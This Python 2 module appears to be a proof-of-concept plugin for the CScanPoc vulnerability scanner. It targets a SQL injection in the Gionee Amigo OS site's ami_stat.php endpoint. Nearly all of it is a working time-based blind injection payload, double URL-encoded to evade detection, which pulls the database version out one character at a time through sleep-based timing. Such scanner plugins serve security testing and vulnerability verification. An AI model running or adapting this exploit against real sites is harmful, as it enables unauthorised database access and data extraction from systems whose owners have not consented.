# coding: utf-8
import time
from urllib import quote

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Amigo_0101' # 平台漏洞编号
    name = '金立OS主站SQL注入' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-01-30'  # 漏洞公布时间
    desc = '''模版漏洞描述
    注入点h /ami_stat/ami_stat.php?val2=undefined&val1=111*&type=search
    注入参数为val1
    正常检测不出来，需要doubleencode一下。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=169052
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Amigo(金立)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '1f6ba870-c3cb-4102-b5d6-e2b28063b260' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-09' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + '/ami_stat/ami_stat.php?val2=undefined&val1={}&type=search'
            payloads = '0123456789.abcdefghijklmnopqrstuvwxyz @_:'
            user = ''
            for i in range(1,10):
                for p in payloads:
                    start_time = time.time()
                    try:
                        key = " 11' xor if(ascii(mid(version(),{},1))={},sleep(5),1) and '1'='1".format(i,ord(p))
                        u = url.format(quote(quote(key)))
                        req = requests.get(u,timeout=60)
                    except Exception,msg:
                        print msg
                    print key
                    if time.time() - start_time > 5:
                        user = user + p
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
                        break
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
